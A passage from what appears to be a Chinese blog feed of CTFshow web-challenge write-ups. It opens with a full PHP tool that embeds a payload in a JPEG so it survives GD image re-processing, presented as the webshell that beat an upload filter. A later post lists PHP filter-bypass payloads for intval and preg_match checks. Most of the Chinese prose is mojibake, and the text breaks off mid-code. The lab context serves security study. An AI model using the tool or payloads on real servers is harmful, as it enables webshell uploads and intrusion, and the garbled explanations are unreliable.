comment">//æ³¨æ„$è½¬ä¹‰</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>æ‰¾äº†å¥½ä¹…æ‰æ‰¾åˆ°å¯ä»¥é€šè¿‡çš„é©¬</p><p><img src="web165.png" alt="image-20240702212536949" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EZphp</title>
      <link href="/2024/06/29/EZphp/"/>
      <url>/2024/06/29/EZphp/</url>
      
        <content type="html"><![CDATA[<h4 id="web89-æ•°ç»„ç»•è¿‡"><a href="#web89-æ•°ç»„ç»•è¿‡" class="headerlink" title="web89(æ•°ç»„ç»•è¿‡)"></a>web89(æ•°ç»„ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åˆ†æä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œæ­£åˆ™åŒ¹é…0-9ï¼ŒåŒ¹é…åˆ°åˆ™è¿”å›trueï¼Œç›´æ¥dieï¼Œä½†æ˜¯ç”±äºpreg_match()åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„æ˜¯æ•°ç»„æ—¶å°†ä¼šè¿”å›false,ä»è€Œç»•è¿‡æ­»äº¡å‡½æ•°ã€‚</p><p>**intval()<strong>å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚</strong>intval()**å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡varçš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç»™intval()å‡½æ•°ä¼ å…¥ä¸€ä¸ªéç©ºçš„æ•°ç»„æ—¶ï¼Œintval()å‡½æ•°å°†ä¼šè¿”å›1ï¼Œç»“åˆæˆ‘ä»¬preg_match()ä¼ å…¥æ•°ç»„è¿”å›falseçš„ç‰¹æ€§ï¼Œè¿™é“é¢˜çš„payloadå°±å¾ˆæ¸…æ¥šäº†ã€‚</p><p>Payload:<code>?num[]=1</code></p><h4 id="web90-intval"><a href="#web90-intval" class="headerlink" title="web90(intval)"></a>web90(intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>intval($var,$base)ï¼Œå…¶ä¸­varå¿…å¡«ï¼Œbaseå¯é€‰ï¼Œè¿™é‡Œbase&#x3D;0,åˆ™è¡¨ç¤ºæ ¹æ®varå¼€å§‹çš„æ•°å­—å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š 0xæˆ–0Xå¼€å¤´ä½¿ç”¨åå…­è¿›åˆ¶ï¼Œ0å¼€å¤´ä½¿ç”¨å…«è¿›åˆ¶ï¼Œå¦åˆ™ä½¿ç”¨åè¿›åˆ¶ã€‚</p><p>è¿™é‡Œ&#x3D;&#x3D;&#x3D;è¡¨ç¤ºç±»å‹å’Œæ•°å€¼å¿…é¡»ç›¸ç­‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨4476çš„å…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶ç»•è¿‡æ£€æµ‹ã€‚</p><p>Paylodï¼š</p><blockquote><p>num&#x3D;010574</p><p>num&#x3D;0x117c</p></blockquote><p>intval() è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ã€‚è¾“å…¥çš„å€¼å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒè¿”å›çš„å†…å®¹å–å†³äºç¬¬ä¸€ä¸ªå­—ç¬¦å·¦ä¾§çš„æ•°å­—ã€‚å¦‚ intval(â€˜11a22â€™)&#x3D;11ã€‚</p><blockquote><p>num&#x3D;4476a</p><p>num&#x3D;+4476</p><p>â€¦</p></blockquote><h4 id="web91-preg-match-m"><a href="#web91-preg-match-m" class="headerlink" title="web91(preg_match  &#x2F;m)"></a>web91(preg_match  &#x2F;m)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token 